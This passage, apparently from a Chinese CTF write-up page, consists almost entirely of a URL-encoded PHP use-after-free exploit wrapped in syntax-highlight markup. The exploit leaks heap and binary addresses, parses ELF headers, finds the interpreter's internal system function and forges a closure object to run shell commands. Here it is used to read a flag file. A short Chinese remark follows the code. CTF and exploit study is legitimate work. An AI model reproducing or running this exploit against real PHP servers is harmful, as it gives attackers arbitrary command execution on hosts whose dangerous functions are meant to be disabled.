class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>-%<span class="number">200</span>x10</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">strlen</span>(<span class="params">%<span class="number">24</span>helper-%<span class="number">3</span>Ea</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>s%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%20%24<span class="title">leak</span>%20%25%3<span class="title">D</span>%202%20%3<span class="title">C</span>%3<span class="title">C</span>%20(<span class="params">%<span class="number">24</span>s%<span class="number">20</span>*%<span class="number">208</span></span>)%20-%201%3<span class="title">B</span>%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">leak</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">parse_elf</span>(<span class="params">%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_type</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x10%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phoff</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x20</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phentsize</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x36%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phnum</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x38%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>e_phnum%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">header</span>%20%3<span class="title">D</span>%20%24<span class="title">base</span>%20%2<span class="title">B</span>%20%24<span class="title">e_phoff</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%20*%20%24<span class="title">e_phentsize</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_type</span>%20%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_flags</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">204</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_vaddr</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>x10</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_memsz</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>x28</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>p_type%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">201</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>p_flags%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">206</span></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">data_addr</span>%20%3<span class="title">D</span>%20%24<span class="title">e_type</span>%20%3<span class="title">D</span>%3<span class="title">D</span>%202%20%3<span class="title">F</span>%20%24<span class="title">p_vaddr</span>%20%3<span class="title">A</span>%20%24<span class="title">base</span>%20%2<span class="title">B</span>%20%24<span class="title">p_vaddr</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">data_size</span>%20%3<span class="title">D</span>%20%24<span class="title">p_memsz</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>p_type%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">201</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>p_flags%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">205</span></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">text_size</span>%20%3<span class="title">D</span>%20%24<span class="title">p_memsz</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">!%<span class="number">24</span>data_addr%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>!%<span class="number">24</span>text_size%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>!%<span class="number">24</span>data_size</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">false</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%5<span class="title">B</span>%24<span class="title">data_addr</span>%2<span class="title">C</span>%20%24<span class="title">text_size</span>%2<span class="title">C</span>%20%24<span class="title">data_size</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_basic_funcs</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>elf</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">list</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>text_size%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>data_size</span>)%20%3<span class="title">D</span>%20%24<span class="title">elf</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_size%<span class="number">20</span>%<span class="number">2</span>F%<span class="number">208</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>*%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">200</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_addr%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">deref</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>leak</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>deref%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span>x746e6174736e6f63</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">204</span></span>)%<span class="number">20</span>*%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">200</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_addr%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">deref</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>leak</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>deref%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span>x786568326e6962</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">data_addr</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%20*%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_binary_base</span>(<span class="params">%<span class="number">24</span>binary_leak</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">base</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">start</span>%20%3<span class="title">D</span>%20%24<span class="title">binary_leak</span>%20%26%200<span class="title">xfffffffffffff000</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x1000%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%3<span class="title">D</span>%20%24<span class="title">start</span>%20-%200<span class="title">x1000</span>%20*%20%24<span class="title">i</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">207</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span>x10102464c457f</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">addr</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_system</span>(<span class="params">%<span class="number">24</span>basic_funcs</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%3<span class="title">D</span>%20%24<span class="title">basic_funcs</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">do</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">f_entry</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">f_name</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>f_entry%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">206</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>f_name%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span>x6d6574737973</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%2<span class="title">B</span>%3<span class="title">D</span>%200<span class="title">x20</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">while</span>(<span class="params">%<span class="number">24</span>f_entry%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">false</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">trigger_uaf</span>(<span class="params">%<span class="number">24</span>arg</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">arg</span>%20%3<span class="title">D</span>%20<span class="title">str_shuffle</span>(<span class="params"><span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">vuln</span>%20%3<span class="title">D</span>%20<span class="title">new</span>%20<span class="title">Vuln</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">vuln</span>-%3<span class="title">Ea</span>%20%3<span class="title">D</span>%20%24<span class="title">arg</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">stristr(<span class="params">PHP_OS%<span class="number">2</span>C%<span class="number">20</span><span class="string">&#x27;WIN&#x27;</span></span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params"><span class="string">&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">n_alloc</span>%20%3<span class="title">D</span>%2010%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%24<span class="title">contiguous</span>%20%3<span class="title">D</span>%20%5<span class="title">B</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>n_alloc%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">contiguous</span>%5<span class="title">B</span>%5<span class="title">D</span>%20%3<span class="title">D</span>%20<span class="title">str_shuffle</span>(<span class="params"><span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">trigger_uaf</span>(<span class="params"><span class="string">&#x27;x&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">abc</span>%20%3<span class="title">D</span>%20%24<span class="title">backtrace</span>%5<span class="title">B1</span>%5<span class="title">D</span>%5<span class="title">B</span>&#x27;<span class="title">args</span>&#x27;%5<span class="title">D</span>%5<span class="title">B0</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">helper</span>%20%3<span class="title">D</span>%20<span class="title">new</span>%20<span class="title">Helper</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">helper</span>-%3<span class="title">Eb</span>%20%3<span class="title">D</span>%20<span class="title">function</span>%20(<span class="params">%<span class="number">24</span>x</span>)%20%7<span class="title">B</span>%20%7<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">strlen(<span class="params">%<span class="number">24</span>abc</span>)%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">2079</span>%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>strlen(<span class="params">%<span class="number">24</span>abc</span>)%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>UAF%<span class="number">20</span>failed%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">closure_handlers</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">php_heap</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x58</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">abc_addr</span>%20%3<span class="title">D</span>%20%24<span class="title">php_heap</span>%20-%200<span class="title">xc8</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x60%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x70%<span class="number">2</span>C%<span class="number">206</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x10%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>abc_addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x60</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x18%<span class="number">2</span>C%<span class="number">200</span>xa</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">closure_obj</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x20</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">binary_leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>closure_handlers%<span class="number">2</span>C%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">!(<span class="params">%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_binary_base(<span class="params">%<span class="number">24</span>binary_leak</span>)</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>Couldn<span class="string">&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%<span class="number">20</span>parse%<span class="number">20</span>ELF%<span class="number">20</span>header%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">!(<span class="params">%<span class="number">24</span>basic_funcs%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_basic_funcs(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>elf</span>)</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>Couldn<span class="string">&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%<span class="number">20</span>get%<span class="number">20</span>zif_system%<span class="number">20</span>address%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">fake_obj_offset</span>%20%3<span class="title">D</span>%200<span class="title">xd0</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x110%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>fake_obj_offset%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>C%<span class="number">20</span>leak(<span class="params">%<span class="number">24</span>closure_obj%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>i</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x20%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>abc_addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>fake_obj_offset</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>xd0%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x38%<span class="number">2</span>C%<span class="number">201</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>xd0%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x68%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>zif_system</span>)%3<span class="title">B</span>%20%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20(<span class="params">%<span class="number">24</span>helper-%<span class="number">3</span>Eb</span>)(<span class="params">%<span class="number">24</span>cmd</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">exit</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">Actfshow</span>(<span class="params">%<span class="number">22</span>cat%<span class="number">20</span>%<span class="number">2</span>Fflag0.txt%<span class="number">22</span></span>)%3<span class="title">Bob_end_flush</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%3<span class="title">F</span>%3<span class="title">E</span></span></span><br></pre></td></tr></table></figure><p>注意这个payload把方法当函数了，但是本质是一样的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 